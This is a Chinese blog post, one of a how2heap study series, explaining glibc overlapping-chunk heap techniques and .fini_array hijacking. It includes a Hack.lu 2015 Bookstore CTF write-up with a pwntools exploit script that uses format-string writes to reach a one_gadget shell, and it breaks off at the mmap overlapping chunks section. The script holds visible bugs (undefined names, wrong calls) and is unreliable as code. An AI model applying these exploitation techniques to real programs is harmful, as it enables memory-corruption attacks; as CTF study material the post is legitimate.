

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Modifier">
  <meta name="keywords" content="">
  
    <meta name="description" content="继续how2heap">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap深入浅出学习堆利用(二)">
<meta property="og:url" content="https://shmodifier.github.io/2024/03/05/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%BA%8C/index.html">
<meta property="og:site_name" content="Modifier">
<meta property="og:description" content="继续how2heap">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://shmodifier.github.io/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
<meta property="article:published_time" content="2024-03-05T13:28:23.000Z">
<meta property="article:modified_time" content="2024-03-05T13:38:05.309Z">
<meta property="article:author" content="Modifier">
<meta property="article:tag" content="Knowledge">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://shmodifier.github.io/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
  
  
  
  <title>how2heap深入浅出学习堆利用(二) - Modifier</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"shmodifier.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":false,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Have a nice day!</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="how2heap深入浅出学习堆利用(二)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-05 21:28" pubdate>
          2024年3月5日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          12k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          100 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">how2heap深入浅出学习堆利用(二)</h1>
            
            
              <div class="markdown-body">
                
                <p>继续how2heap</p>
<span id="more"></span>

<h1 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h1><blockquote>
<p>这一部分在 how2heap 里是分 1 和 2 的，1 的原理是：通过溢出漏洞修改空闲堆块的 size ，将地址相邻的两个 chunk “合并”。 如果 free 后再次申请一个大小匹配的堆块，就会堆块的重叠。</p>
<p>比较简单一看就懂，就略过直接开始 2 了</p>
</blockquote>
<p><strong>原理：</strong>在释放堆块之前修改它的 size 大小，等它被释放后，错误地修改下一个 chunk 的 prev_size，导致中间的chunk 强行合并。</p>
<p><strong>GDB 调试</strong></p>
<p>我们在本次实验中共分配五个堆块，其中第一个堆块用于模拟溢出漏洞来改写第二个堆块的数据，我们目标重叠的部分是第二至第四个堆块，第五个堆块用于防止与 top chunk 合并。</p>
<p>我们先 free chunk 4 </p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/overlap_free4.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来，我们利用 chunk1 的溢出漏洞来改写 chunk2 的 size 值。将 size 改为 chunk2 和 chunk3 的大小之和，在本次实例中就是 <code>0x3f0+0x3f0+0x1=0x7e1</code></p>
<p>这时我们再 free 2，根据这个被修改的 size 值，程序会以为 chunk 2 加上 chunk 3 的区域都是要释放的，就会错误地修改了chunk 5的 prev_size 。</p>
<p>接着，它发现紧邻的一块chunk 4也是 free 状态，就把它俩合并在了一起，组成一个大free chunk，放进unsorted bin中。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/overlap_free2.png" srcset="/img/loading.gif" lazyload></p>
<p>这样，我们就对 chunk3 造成了重叠，可以改写其中的内容了。</p>
<h3 id="🗡️真题实战-Hack-lu-CTF-2015-Bookstore"><a href="#🗡️真题实战-Hack-lu-CTF-2015-Bookstore" class="headerlink" title="🗡️真题实战 Hack.lu CTF 2015 Bookstore"></a>🗡️真题实战 Hack.lu CTF 2015 Bookstore</h3><p>题目是一个订书系统，选项1-5 对应 1、2 编辑订单信息，3、4删除订单信息，5 提交订单信息。</p>
<p>其中1、2 的编辑功能用同一个函数实现，存在溢出漏洞</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/bookstore_edit.png" srcset="/img/loading.gif" lazyload></p>
<p>删除订购单是 free 掉了对应的指针，没有把指针指针置为 NULL，存在 UAF 漏洞。</p>
<p>最后提交功能中有格式化字符串漏洞，但是这个漏洞在 submit 功能中，只能利用一次。</p>
<ul>
<li>首先考虑如何利用格式化字符串的漏洞：</li>
</ul>
<p>我们必须得要控制 dest 的内容才能进行漏洞的利用，那么该如何控制呢？程序最开始的时候分配了三个连续的堆块 <em>v6</em>、<em>v7</em> 和 <em>dest</em>，我们可以通过溢出 <em>v7</em> 来修改 <em>dest</em> 的内容。但是最后会被改写为固定的内容 “Your order is submitted”。</p>
<blockquote>
<p>真奇怪我看花眼也没看出来哪里给它赋值了</p>
</blockquote>
<p>在最后执行 submitted 的时候会申请一个 <em>v5</em> ，这个堆块的指针是不确定的，我们可以从 top chunk 里重新分配，也可以 free 掉 <em>v6</em> 、<em>v7</em>，从他们当中分配。这样，我们就可以利用 overlapping ，利用 <em>v7</em> 实现 dest 部分的堆重叠，从而在 submitted 时改写 <em>dest</em> 。</p>
<ul>
<li>因为我们首先需要利用格式化字符串泄露基址，然后需要再利用一次去改写地址，所以接下来考虑如何多次利用格式化字符串：</li>
</ul>
<p>在接收用户选择输入时，允许用户输入 128 长度的字符串，但是长度不够去利用栈溢出到返回地址，所以我们需要利用其他的方法。</p>
<p>我们需要用到另外一个知识点：<strong>程序退出后会执行 <code>.fini_array</code> 地址处的函数，不过只能利用一次。</strong></p>
<h4 id="中插知识点之-init-array-和-fini-array-节！"><a href="#中插知识点之-init-array-和-fini-array-节！" class="headerlink" title="中插知识点之 .init_array 和  .fini_array 节！"></a>中插知识点之 .init_array 和  .fini_array 节！</h4><blockquote>
<p>大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。</p>
<p>.init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写 .fini_array 函数指针。</p>
<p>对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。</p>
</blockquote>
<p>我们可以利用如下代码自己实验一下 .ini_array 和 .fini_array 的指针属性：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((constructor))</span>;<br><span class="hljs-comment">//constructor意为构造函数声明，所有构造函数都会在main函数之前执行</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((destructor))</span>;<br><span class="hljs-comment">//destructor意为析构函数，所有析构函数都会在main函数之后运行</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start == %p\n&quot;</span>, start);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stop == %p\n&quot;</span>, stop);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;goodbye world!\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>我们执行这个程序，并查看其 .init_array 和 .fini_array 的地址</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_1.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_3.png" srcset="/img/loading.gif" lazyload></p>
<p>我们可以查看 .init_array 和 .fini_array 地址处存储的指针：</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_2.png" srcset="/img/loading.gif" lazyload></p>
<p>.init_array 存的 <code>0x400540</code> 是 frame_dummy 函数地址（可以在 ida 里面查看），<code>0x4005a4</code> 是我自己定义的 start 函数的地址，也就是说 main 函数开始之前会先执行 frame_dummy 函数和 start 函数。</p>
<p>.fini_array 存的 <code>0x400520</code> 是 do_global_dtors_aux 函数地址，<code>0x4005b5</code> 是自己定义的 stop 函数的地址，也就是说 main 函数结束之后会执行 do_global_dtors_aux 函数和 stop 函数。</p>
<p>去除我们自己定义的属性，此时 .ini_array 和 .fini_array 都只有一个函数指针，对应的 .ini_array 是 frame_dummy 函数地址，fini_array是 __do_global_dtors_aux 函数地址。</p>
<blockquote>
<p>知识点结束！</p>
</blockquote>
<hr>
<p>所以我们可以利用第一次格式化字符串将 <code>.fini_array</code> 地址处的函数修改成 main 函数的地址，使程序重新回到 main 函数。除此之外，我们还需要泄漏 libc 地址，再进行 shellcode 的构造这样就是总共利用三次格式化字符串。</p>
<p>我们可以直接在 ida 里面看到 <code>.fini_array</code>  的地址是 0x6011B8：</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_fini.png" srcset="/img/loading.gif" lazyload></p>
<p>新的问题来了，怎么把  <code>.fini_array</code>  输入进栈并确定它与 printf 的偏移？同一个函数的栈空间是固定的，我们只需要确定偏移，只需要利用前面的 0x80 的空间，我们可以将 <code>.fini_arry</code> 输入到 s 里然后通过调试确定偏移。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/printf_padding.png" srcset="/img/loading.gif" lazyload></p>
<p>断点打在 <code>printf(dest)</code> 处，可以得出我们输入的 s 在栈上的偏移是 12。</p>
<p>除了 fini 的偏移，我们还需要确定 libc 基址的偏移：</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_padding.png" srcset="/img/loading.gif" lazyload></p>
<p>这个栈地址始终指向比自己低 <code>0x10</code> 字节的栈地址，而且指向的栈地址和返回地址也有固定的 <code>0x28</code> 的偏移，所以我选择用格式化字符串泄漏这个栈地址，但是这里还有一个问题：</p>
<p>我们在填充格式化字符串漏洞时，也需要考虑 submitt 函数的功能。我们现在覆盖用 <em>v7</em> 覆盖了 <em>dest</em> 部分，所以输出的字符串将是：</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_dest.png" srcset="/img/loading.gif" lazyload></p>
<p>由上图可以看出，我们可以控制的部分是 chunk1 的内容，我们想要控制格式化字符串部分在 <em>dest</em> 指针处，可以控制 chunk1 的内容长度，让其第二次被写入 <em>v5</em> 时刚好重叠在 <em>dest</em> 的位置。</p>
<p>也就是：</p>
<p>size(<code>Order 1:</code> + <code>chunk1</code> + <code>&#39;\n&#39;</code> + <code>Order 2:</code> + <code>Order 1:</code>) &#x3D; 0x90</p>
<p>size(<code>chunk1</code>) &#x3D; 0x90 - 28 &#x3D; 0x74</p>
<p>所以我们构造 <code>chunk1</code> 中的内容的时候只要使其中非 0 字符串的个数达到 <code>0x74</code> 就行了。</p>
<p>综上！</p>
<blockquote>
<p>这道题对我来说好难啊😢对着别人的 wp 磕了两天才嗑明白，格式化字符串的部分还是有些生疏了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./books&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b main&quot;)</span><br>elf=ELF(<span class="hljs-string">&quot;./books&quot;</span>)<br>free_got=f.got[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">num,msg</span>):<br>    p.sendline(num)<br>    p.sendline(msg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">num</span>):<br>    p.sendline(num)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br><br>fini_addr=<span class="hljs-number">0x6011b8</span><br>start = <span class="hljs-number">0x400780</span><br>one = [<span class="hljs-number">0x45206</span>,<span class="hljs-number">0x4525a</span>,<span class="hljs-number">0xcc673</span>,<span class="hljs-number">0xcc748</span>,<span class="hljs-number">0xefa00</span>,<span class="hljs-number">0xf0897</span>,<span class="hljs-number">0xf5e40</span>,<span class="hljs-number">0xef9f4</span>] <br><br>delete(<span class="hljs-number">2</span>)<br><br>payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(start &amp; <span class="hljs-number">0xffff</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">b&#x27;c%13$hn&#x27;</span> <span class="hljs-comment">#修改fini的内容</span><br>payload=payload+<span class="hljs-string">b&quot;function:%31$p stack:%33$p&quot;</span>    <span class="hljs-comment"># 泄露栈顶地址和函数地址</span><br>payload=payload+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x74</span>-<span class="hljs-built_in">len</span>(payload))<br>payload=payload+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x88</span>-<span class="hljs-built_in">len</span>(payload))+p64(<span class="hljs-number">0x151</span>)<br><br>edit(<span class="hljs-number">1</span>，payload)<br>submit(p64(fini_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;stack:&quot;</span>)<br>stack_addr=p.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>)[:-<span class="hljs-number">1</span>]<br>stack_addr=<span class="hljs-built_in">int</span>(stack_addr,<span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;function:&quot;</span>)<br>libc_start_main=p.recvuntil(<span class="hljs-string">b&quot; &quot;</span>)[:-<span class="hljs-number">1</span>]<br>libc_start_main=<span class="hljs-built_in">int</span>(libc_start_main,<span class="hljs-number">16</span>) <span class="hljs-comment"># 将0x形式的字符串转化数字</span><br><br>libc_start_main=libc_start_main-<span class="hljs-number">240</span><br><br>libc_addr=libc_start_main-<span class="hljs-number">0x20750</span><br>stack_addr=stack_addr-<span class="hljs-number">0x1b0</span>-<span class="hljs-number">0x110</span> +<span class="hljs-number">208</span><br>onegadget_addr=libc_addr+<span class="hljs-number">0x45226</span><br><br><br>one_gadget = libc_base + one[<span class="hljs-number">0</span>]<br>one1 = u16(p64(one_gadget)[:<span class="hljs-number">2</span>])-<span class="hljs-number">22</span>  <span class="hljs-comment">#最后2字节 +偏移</span><br>one2 = u8(p64(one_gadget)[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>]) -<span class="hljs-number">6</span> <span class="hljs-comment">#最后第3字节+偏移</span><br><br>delete2()<br><span class="hljs-built_in">print</span>(one1)<br><span class="hljs-built_in">print</span>(one2)<br>payload=<span class="hljs-string">b&quot;%&quot;</span>+one1+<span class="hljs-string">b&quot;c%13$hhn&quot;</span>+<span class="hljs-string">b&quot;%&quot;</span>+one2+<span class="hljs-string">b&quot;c%14$hn&quot;</span><br><br>payload=payload+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x90</span>-<span class="hljs-number">28</span>-<span class="hljs-built_in">len</span>(payload))<br>payload=payload+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x88</span>-<span class="hljs-built_in">len</span>(payload))+p64(<span class="hljs-number">0x151</span>)<br><span class="hljs-comment"># Order 1: 内容\nOrder 2: Order 1: 内容\nOrder 2: \n</span><br>edit(<span class="hljs-number">1</span>，payload)<br><br>submit(<span class="hljs-string">b&#x27;5&#x27;</span>+<span class="hljs-number">7</span>*p8(<span class="hljs-number">0x0</span>)+p64(stack_addr+<span class="hljs-number">2</span>)+p64(stack_addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h1><blockquote>
<p>到这里那个狼组安全就结束了，我又实在看不懂英文原版所以找了一个新的，这位师傅写的很详细：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272416.htm#msg_header_h2_15">原创|how2heap深入浅出学习堆利用-Pwn</a></p>
</blockquote>
<p><strong>原理：</strong>通过overlap获取一块可以修改的内存，从而将这里面的地址修改为目标地址。</p>
<p><strong>知识点✨：</strong></p>
<ul>
<li>申请超过 0x100000 这么大的内存时，系统不再从 heap 段分割，而是通过 <code>sysmalloc</code> 函数从 mmap 段分配。mmap 映射段在 64 位系统中自高地址向低地址增长，mmap chunk 分配起始值是<code>mp_.mmap_threshold</code> ，随着上一次 free mmap chunk 动态变化，取最大值，尽量减少 mmap 数量。</li>
<li>mmap chunk 的 <code>prev_size</code> 位不再是下一个 chunk 的大小，而是本 chunk 中没有使用的部分的大小。因为mmap 分配的 chunk 都需要按页对齐，造成了许多不必要的空间浪费。mmap chunks 的 <em>fd</em>、<em>bk</em> 指针也没有使用，因为他们不会进入 bin 的链表中，而是直接归还给系统。</li>
<li>在 mmap 映射段中同样也包含了 libc 的映射</li>
</ul>
<p><strong>GDB 调试</strong></p>
<blockquote>
<p>代码超精简版</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br> <span class="hljs-type">long</span> *m1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br> <span class="hljs-type">long</span> *m2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br> <span class="hljs-type">long</span> *m3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br> <span class="hljs-type">long</span> size =  m3[<span class="hljs-number">-1</span>]<span class="hljs-number">-2</span> + m2[<span class="hljs-number">-1</span>]<span class="hljs-number">-2</span> + <span class="hljs-number">2</span>;<br> m3[<span class="hljs-number">-1</span>] = size;<br> <span class="hljs-built_in">free</span>(m3);<br> <span class="hljs-type">long</span> *m4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br> m4[m2-m4] = <span class="hljs-number">0x1122334455667788</span>;<br> assert(m2[<span class="hljs-number">0</span>] == <span class="hljs-number">0x1122334455667788</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
<p>我们首先申请三个 0x100000 的大堆块</p>
